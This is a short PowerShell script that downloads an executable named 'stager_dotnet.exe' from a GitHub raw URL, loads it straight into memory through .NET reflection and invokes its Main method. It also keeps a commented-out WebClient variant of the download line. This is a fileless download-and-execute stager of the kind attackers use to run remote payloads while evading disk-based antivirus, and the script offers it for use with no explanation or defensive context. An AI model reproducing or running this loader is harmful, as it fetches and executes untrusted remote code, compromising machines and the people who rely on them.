#$bytes = ((New-Object System.Net.WebCLient).DownloadData("https://github.com/yorkvik/files/raw/master/stager_dotnet.exe"))
$bytes = (Invoke-WebRequest "https://github.com/yorkvik/files/raw/master/stager_dotnet.exe" -UseBasicParsing ).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = 
 $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').
   GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('foo', 'bar')))
